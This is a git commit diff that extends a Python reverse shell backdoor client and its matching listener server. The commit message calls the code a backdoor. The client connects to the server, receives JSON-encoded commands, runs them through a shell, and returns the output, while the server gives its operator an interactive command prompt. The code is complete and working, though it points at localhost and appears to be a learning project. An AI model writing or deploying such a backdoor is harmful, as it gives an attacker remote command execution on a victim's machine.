baaa719f74606831d651b8c8d209134561c39e40
laevad <aldave.tabian@ustp.edu.ph>
2021-03-02 06:46:49 -0500

    fixing backdoor bugs and adding functions

--- reverse_shell.py
+++ reverse_shell.py
@@ -1,17 +1,45 @@
 #!/usr/bin/python
 import socket
 import subprocess # this allow us to input something in the cli
+import json
+
+
+# we gonna send send and receive data as wew want ==
+def reliable_send(data):
+        json_data = json.dumps(data)
+         # print("testing the json send: "+json_data)
+        sock.send(json_data)
+
+def reliable_rcv():
+        json_data = ""
+        # run loop to add data
+        while True:
+                try:
+                        json_data = json_data + sock.recv(1024)
+                        # print("testing the json data receving: " + json_data)
+                        # print("print the json loads: "+ json.loads(json_data))
+                        return json.loads(json_data)
+                except ValueError:
+                        # print("reliable_rcv except (continue)..")
+                        continue
+
+
+def shell():
+	while True:
+		command = reliable_rcv() # receive bytes
+		if command  == "q":
+			break
+		else:
+			try:
+				process = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE, stderr = subprocess.PIPE, stdin=subprocess.PIPE)
+				result = process.stdout.read() + process.stderr.read()
+				reliable_send(result)
+
+			except:
+				reliable_send("CAN'T EXECUTE THE COMMAND!!!")
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # IPv4 and TCP
 sock.connect(("127.0.0.1", 54321))
 print("connection establish to server")
-
-while True:
-	command = sock.recv(1024) # receive bytes
-	if command  == "q":
-		break
-	else:
-		process = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE, stderr = subprocess.PIPE, stdin=subprocess.PIPE)
-		result = process.stdout.read() + process.stderr.read()
-		sock.send(result)
+shell()
 sock.close()
--- server.py
+++ server.py
@@ -1,24 +1,55 @@
 #!/usr/bin/python
 import socket
+import json # use this inorder to dump the data as bytes as it can
 
 
-# create simple connection
-# ipv4 run over tcp
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-s.bind(("127.0.0.1",54321))
-s.listen(5) # connection
-print("listening for incoming connection")
-target , ip = s.accept() # accept the connection
-print("connected")
+# we gonna send send and receive data as wew want ==
+def reliable_send(data):
+	json_data = json.dumps(data)
+	# print("testing the json send: "+json_data)
+	target.send(json_data)
 
-while True:
-	# command to send to client (input)
-	command = raw_input("* Shell#~%s: " % str(ip))
-	target.send(command) # this function send command to client
-	if command == "q":
-		break
-	else:
-		result = target.recv(1024) #  receive bytes
-		print(result)
+def reliable_rcv():
+	json_data = ""
+	# run loop to add data
+	while True:
+		try:
+			json_data = json_data + target.recv(1024)
+			# print("testing the json data receving: " + json_data)
+			# print("print the json loads: "+ json.loads(json_data))
+			return json.loads(json_data)
+		except ValueError:
+			# print("reliable_rcv except (continue)..")
+			continue
+
+#==-----------------------------
+
+
+def shell():
+	while True:
+		# command to send to client (input)
+		command = raw_input("* Shell#~%s: " % str(ip))
+		reliable_send(command) # this function send command to client
+		if command == "q":
+			break
+		else:
+			result = reliable_rcv() #  receive bytes
+			print(result)
+
+
+def server():
+	global s, ip, target
+	# create simple connection
+	# ipv4 run over tcp
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+	s.bind(("127.0.0.1",54321))
+	s.listen(5) # connection
+	print("listening for incoming connection")
+	target , ip = s.accept() # accept the connection
+	print("connected")
+
+
+server()
+shell()
 s.close()
